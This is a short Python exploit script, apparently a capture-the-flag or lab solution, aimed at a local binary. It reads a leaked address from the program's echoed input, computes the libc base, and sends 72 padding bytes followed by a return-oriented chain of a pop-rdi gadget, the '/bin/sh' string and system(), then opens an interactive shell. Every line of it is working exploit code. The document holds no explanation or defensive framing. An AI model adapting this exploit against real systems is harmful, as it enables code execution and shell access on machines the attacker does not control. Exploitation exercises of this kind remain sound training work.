import interact
import struct

# Pack integer 'n' into a 8-Byte representation
def p64(n):
    return struct.pack('Q', n)

# Unpack 8-Byte-long string 's' into a Python integer
def u64(s):
    return struct.unpack('Q', s)[0]

p = interact.Process()
print(p.readuntil('data'))
p.sendline("A"*8)

print(p.readuntil("Your input was: "))
infoleak_line = p.readuntil("Enter data:")
infoleak = infoleak_line.split('\n')[0][8:]
infoleak = u64(infoleak + '\x00'*2)
libc_base = infoleak - 0x8b720
print(hex(libc_base))

sh = p64(libc_base + 0x18cd57)
system = p64(libc_base + 0x45390)
pop_rdi = p64(libc_base + 0x0000000000021102)
pop_rax = p64(libc_base + 0x0000000000033544)
pop_rsi = p64(libc_base + 0x00000000000202e8)
pop_rdx = p64(libc_base + 0x0000000000001b92)
syscall = p64(libc_base + 0x00000000000bc375)

payload = "\x00"*72 + pop_rdi + sh + system

p.sendline(payload)
p.interactive()
